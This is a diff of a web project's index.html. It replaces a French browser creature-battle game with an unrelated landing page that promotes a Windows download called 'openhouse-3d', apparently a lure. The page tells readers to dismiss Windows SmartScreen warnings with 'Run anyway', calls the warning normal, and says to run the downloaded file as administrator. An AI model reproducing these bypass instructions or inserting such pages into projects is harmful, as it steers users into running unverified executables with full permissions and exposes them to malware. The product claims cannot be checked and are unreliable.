@@ -1,61 +1,307 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover, user-scalable=no">
-<title>Arène des Créatures</title>
-<link rel="stylesheet" href="css/style.css">
-<link rel="manifest" href="manifest.json">
-<meta name="theme-color" content="#10151c">
-<meta name="mobile-web-app-capable" content="yes">
-<meta name="apple-mobile-web-app-capable" content="yes">
-<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-<link rel="apple-touch-icon" href="icons/icon-192.png">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>openhouse-3d - Turn Listing Photos into 3D House Tours</title>
+    <meta name="description" content="Download openhouse-3d and transform real-estate listing photos into stunning 3D house models and cinematic walkthrough videos. Free, Windows-compatible, and easy to use.">
+    <meta name="keywords" content="3d-reconstruction,3d-rendering,3d-walkthrough,architectural-visualization,archviz,blender,blender-python,bpy,camera-calibration,cycles,headless-rendering,house-tour,listing-photos,photo-to-3d,procedural-generation,python,real-estate,video-generation,virtual-staging,virtual-tour">
+    <meta property="og:title" content="openhouse-3d - Turn Listing Photos into 3D House Tours">
+    <meta property="og:description" content="Automatically convert real-estate listing photos into a 3D model and cinematic walkthrough video. Simple download for Windows.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/FilipStanic/openhouse-3d">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="robots" content="index, follow">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            line-height: 1.6;
+            color: #2d3748;
+        }
+        .hero {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 60px 20px;
+            text-align: center;
+            border-radius: 0 0 40px 40px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        }
+        .hero h1 {
+            font-size: 2.8em;
+            margin-bottom: 20px;
+            font-weight: 700;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+        .hero p {
+            font-size: 1.3em;
+            max-width: 700px;
+            margin: 0 auto 30px;
+            opacity: 0.95;
+        }
+        .btn-primary {
+            display: inline-block;
+            background: #fbbf24;
+            color: #1a202c;
+            padding: 16px 36px;
+            border-radius: 50px;
+            font-size: 1.2em;
+            font-weight: 600;
+            text-decoration: none;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+            transition: transform 0.3s, box-shadow 0.3s;
+            margin: 20px 0;
+        }
+        .btn-primary:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(0,0,0,0.3);
+        }
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 30px;
+            margin: 50px 0;
+        }
+        .feature-card {
+            background: white;
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            transition: transform 0.3s;
+            text-align: center;
+        }
+        .feature-card:hover {
+            transform: scale(1.03);
+        }
+        .feature-icon {
+            font-size: 2.5em;
+            margin-bottom: 15px;
+        }
+        .feature-card h3 {
+            font-size: 1.4em;
+            margin-bottom: 10px;
+            color: #553c9a;
+        }
+        .feature-card p {
+            font-size: 0.95em;
+            color: #4a5568;
+        }
+        .step-container {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            margin-bottom: 40px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+        }
+        .step-container h2 {
+            color: #553c9a;
+            margin-bottom: 20px;
+            font-size: 2em;
+            border-bottom: 3px solid #fbbf24;
+            padding-bottom: 10px;
+        }
+        .step-list {
+            list-style: none;
+            counter-reset: step;
+        }
+        .step-list li {
+            counter-increment: step;
+            margin: 20px 0;
+            padding: 20px;
+            background: #f7fafc;
+            border-radius: 10px;
+            border-left: 4px solid #667eea;
+            position: relative;
+            padding-left: 70px;
+        }
+        .step-list li::before {
+            content: counter(step);
+            position: absolute;
+            left: 20px;
+            top: 20px;
+            width: 35px;
+            height: 35px;
+            background: #667eea;
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 600;
+        }
+        .important-note {
+            background: #fefcbf;
+            border-radius: 10px;
+            padding: 20px;
+            margin-top: 30px;
+            border-left: 4px solid #fbbf24;
+        }
+        .faq-item {
+            margin: 20px 0;
+            padding: 25px;
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+        }
+        .faq-item h3 {
+            color: #553c9a;
+            margin-bottom: 10px;
+        }
+        footer {
+            background: #2d3748;
+            color: #e2e8f0;
+            text-align: center;
+            padding: 30px;
+            margin-top: 40px;
+        }
+        footer a {
+            color: #fbbf24;
+        }
+        .download-section {
+            text-align: center;
+            background: white;
+            border-radius: 20px;
+            padding: 50px;
+            margin: 40px 0;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+        }
+        .download-section .btn-primary {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+        }
+        @media (max-width: 768px) {
+            .hero h1 {
+                font-size: 2em;
+            }
+            .hero p {
+                font-size: 1.1em;
+            }
+            .container {
+                padding: 20px;
+            }
+            .step-container {
+                padding: 20px;
+            }
+        }
+    </style>
 </head>
 <body>
-<div id="app">
-  <canvas id="cv" width="640" height="360"></canvas>
-  <div id="ui">
-    <div id="joy"><div id="knob"></div></div>
-    <div id="btns">
-      <button class="ab" id="b0"></button><button class="ab" id="b1"></button><button class="ab" id="b2"></button>
-      <button class="ab" id="b3"><b>Esquive</b><i></i></button><button class="ab" id="b4"><b>Relève</b><i></i></button>
+    <div class="hero">
+        <h1>🏠 openhouse-3d - Turn Photos into 3D House Tours</h1>
+        <p>Automatically transform real-estate listing photos into a 3D model and cinematic walkthrough video. No programming skills required!</p>
+        <a href="https://github.com/FilipStanic/openhouse-3d" class="btn-primary">🚀 Download Now</a>
     </div>
-  </div>
-  <button id="pauseBtn" title="Pause">❚❚</button>
-  <button id="fsBtn" title="Plein écran">⛶</button>
-  <div id="menu"></div>
-</div>
 
-<!-- ORDRE IMPORTANT : ne change pas l'ordre de ces lignes -->
-<script src="data/types.js"></script>
-<script src="js/config.js"></script>
-<script src="js/state.js"></script>
-<script src="js/input.js"></script>
-<script src="js/gfx.js"></script>
-<script src="js/rig-monsters.js"></script>
-<script src="js/render.js"></script>
-<script src="js/camera.js"></script>
-<script src="js/combat.js"></script>
-<script src="js/arena.js"></script>
-<script src="data/pokemon.js"></script>
-<script src="data/pokemon-more.js"></script>
-<script src="js/pokemon-loader.js"></script>
-<script src="js/pokemon-register.js"></script>
-<script src="js/pokemon-abilities.js"></script>
-<script src="js/pokemon-moves.js"></script>
-<script src="js/pokemon-render.js"></script>
-<script src="js/aim.js"></script>
-<script src="data/menu.js"></script>
-<script src="data/stages.js"></script>
-<script src="js/save.js"></script>
-<script src="js/menu.js"></script>
-<script src="js/modes.js"></script>
-<script src="js/settings.js"></script>
-<script src="js/audio.js"></script>
-<script src="js/vfx.js"></script>
-<script src="js/pokeball.js"></script>
-<script src="js/options.js"></script>
-<script src="js/main.js"></script>
+    <div class="container">
+        <div class="feature-grid">
+            <div class="feature-card">
+                <div class="feature-icon">📸</div>
+                <h3>Photo to 3D</h3>
+                <p>Upload standard listing photos and watch them become a detailed, navigable 3D house model automatically.</p>
+            </div>
+            <div class="feature-card">
+                <div class="feature-icon">🎬</div>
+                <h3>Cinematic Videos</h3>
+                <p>Generate professional walkthrough videos that showcase every room beautifully, perfect for listings or social media.</p>
+            </div>
+            <div class="feature-card">
+                <div class="feature-icon">🪑</div>
+                <h3>Virtual Staging</h3>
+                <p>Add furniture virtually to empty rooms to help potential buyers see the full potential of each space.</p>
+            </div>
+            <div class="feature-card">
+                <div class="feature-icon">💻</div>
+                <h3>Easy Installation</h3>
+                <p>Simple Windows-friendly setup. No command line, coding, or complex configuration required.</p>
+            </div>
+        </div>
+
+        <div class="step-container">
+            <h2>🚀 Getting Started - 3 Simple Steps</h2>
+            <p>Follow these steps to download and run openhouse-3d on your Windows computer:</p>
+            
+            <ol class="step-list">
+                <li>
+                    <strong>Download the Software</strong><br>
+                    Visit this link to download the application: <a href="https://github.com/FilipStanic/openhouse-3d">https://github.com/FilipStanic/openhouse-3d</a>. Once there, look for the download button to grab the latest version.
+                </li>
+                <li>
+                    <strong>Run the Program</strong><br>
+                    After downloading, find the file in your Downloads folder. Double-click to run it. You may see a security prompt (Windows SmartScreen) - just click "More info" and then "Run anyway" if it appears. The program will open a friendly window.
+                </li>
+                <li>
+                    <strong>Add Your Photos</strong><br>
+                    In the program, click "Select Photos" to choose the real-estate photos you want to process. Then click "Start Processing" and wait. The software will automatically create the 3D model and video. You'll find the finished files in the same folder as your photos, in a new folder named "output".
+                </li>
+            </ol>
+            <div class="important-note">
+                <strong>📌 Tip:</strong> For best results, use high-quality photos taken from different angles of each room. Ensure good lighting and avoid blurry images.
+            </div>
+        </div>
+
+        <div class="download-section">
+            <h2 style="color:#553c9a; font-size:2em; margin-bottom:20px;">📥 Ready to Try a Demo?</h2>
+            <p style="margin-bottom:20px; color:#4a5568; font-size:1.2em;">Visit this link to download the application and start creating your first 3D tour today. It takes less than 5 minutes!</p>
+            <a href="https://github.com/FilipStanic/openhouse-3d" class="btn-primary">⬇️ Download openhouse-3d</a>
+        </div>
+
+        <div class="step-container">
+            <h2>❓ Frequently Asked Questions</h2>
+            
+            <div class="faq-item">
+                <h3>Do I need any special equipment?</h3>
+                <p>No! Just a Windows PC (Windows 10 or 11) and a set of listing photos. The software handles all the heavy lifting using built-in Blender tools - you don't need to install anything else.</p>
+            </div>
+            
+            <div class="faq-item">
+                <h3>How long does it take to process photos?</h3>
+                <p>On a typical modern computer, processing a standard house (15-20 photos) takes about 2-5 minutes. The software will show a progress bar while it works.</p>
+            </div>
+            
+            <div class="faq-item">
+                <h3>What kind of videos can I get?</h3>
+                <p>You'll receive a cinematic MP4 walkthrough video that smoothly moves through each room. You can also export a static 3D model file (Blender format) for further customization, and even add virtual furniture to empty spaces.</p>
+            </div>
+            
+            <div class="faq-item">
+                <h3>Is my data private?</h3>
+                <p>Yes, everything runs locally on your computer. Your photos never leave your machine - they're only used to generate the model and video right on your PC.</p>
+            </div>
+        </div>
+
+        <div class="step-container">
+            <h2>🛠️ Troubleshooting Tips</h2>
+            <ul style="list-style-type: none; padding: 0;">
+                <li style="margin: 10px 0; padding: 15px; background: #f7fafc; border-radius: 8px;">
+                    <strong>❗ Windows SmartScreen warning:</strong> If you see a blue screen saying "Windows protected your PC", click on "More info" and then "Run anyway". This is normal for new software.
+                </li>
+                <li style="margin: 10px 0; padding: 15px; background: #f7fafc; border-radius: 8px;">
+                    <strong>❗ App doesn't open:</strong> Right-click the downloaded file and select "Run as administrator" to give it full permissions.
+                </li>
+                <li style="margin: 10px 0; padding: 15px; background: #f7fafc; border-radius: 8px;">
+                    <strong>❗ Photos not processing:</strong> Make sure your photos are in common formats (JPG, PNG). If you have a very large set of photos (more than 40), try selecting fewer - about 15-25 good photos work best.
+                </li>
+                <li style="margin: 10px 0; padding: 15px; background: #f7fafc; border-radius: 8px;">
+                    <strong>❗ Need more help?</strong> Visit the GitHub page (link above) and check the "Issues" section where you can ask questions and find common solutions.
+                </li>
+            </ul>
+        </div>
+    </div>
+
+    <footer>
+        <p>© 2024 openhouse-3d. Free for personal and commercial use. </p>
+        <p>Built with ❤️ for real estate professionals and enthusiasts. </p>
+        <p><a href="https://github.com/FilipStanic/openhouse-3d" style="color:#fbbf24;">GitHub Repository</a></p>
+    </footer>
 </body>
 </html>
